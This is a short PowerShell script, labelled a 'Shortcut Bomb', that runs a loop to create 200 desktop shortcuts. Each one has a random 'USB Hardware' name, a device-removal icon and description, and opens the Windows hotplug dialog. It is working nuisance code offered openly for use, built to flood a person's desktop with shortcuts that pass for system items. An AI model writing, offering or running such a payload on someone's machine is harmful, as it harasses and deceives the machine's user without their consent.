<#
========================= Simple Shortcut Bomb ============================--

SYNOPSIS
This script will create 200 shortcuts on the desktop very quickly.

USAGE
1. Change '200' to the number of shortcuts you want created
2. Run the script.

#>

$n = 200
$i = 0

while($i -lt $n) 
{
$num = Get-Random
$Location = "C:\Windows\System32\rundll32.exe"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
$Shortcut.TargetPath = $Location
$Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
$Shortcut.IconLocation = "hotplug.dll,0"
$Shortcut.Description ="Device Removal"
$Shortcut.WorkingDirectory ="C:\Windows\System32"
$Shortcut.Save()
Start-Sleep -Milliseconds 10
$i++
}
